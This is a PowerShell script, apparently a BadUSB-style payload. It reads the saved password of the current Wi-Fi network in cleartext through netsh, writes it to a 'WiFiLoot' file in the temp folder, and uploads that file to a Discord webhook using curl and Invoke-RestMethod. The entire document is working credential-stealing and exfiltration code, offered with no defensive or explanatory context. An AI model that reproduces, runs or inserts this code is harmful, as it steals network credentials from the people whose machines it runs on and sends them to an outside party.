$networkProfile = & { 
    $networkProfile = Get-NetConnectionProfile
    $networkName = $networkProfile.Name
    $networkPassword = (netsh wlan show profile name="$networkName" key=clear | Select-String "Key Content").ToString() -replace ".*:\s*(.*)", '$1'
    $hostname = $env:COMPUTERNAME
    $date = Get-Date -Format "yyyyMMdd"
    $filename = "$env:TEMP\WiFiLoot-$hostname-$date.txt"
    $lootData = "Network: $networkName`r`nPassword: $networkPassword"
    $lootData | Out-File -FilePath $filename
    Write-Output "Network details saved to: $filename"
}

function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,

        [parameter(Position=1,Mandatory=$False)]
        [string]$text
    )
    
    $hookurl = $hookurl
    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrEmpty($file))){
        curl.exe --insecure -F "file1=@$file" $hookurl
    }
}

Upload-Discord -file "$env:TEMP\WiFiLoot-$env:COMPUTERNAME-$(Get-Date -Format 'yyyyMMdd').txt"

exit
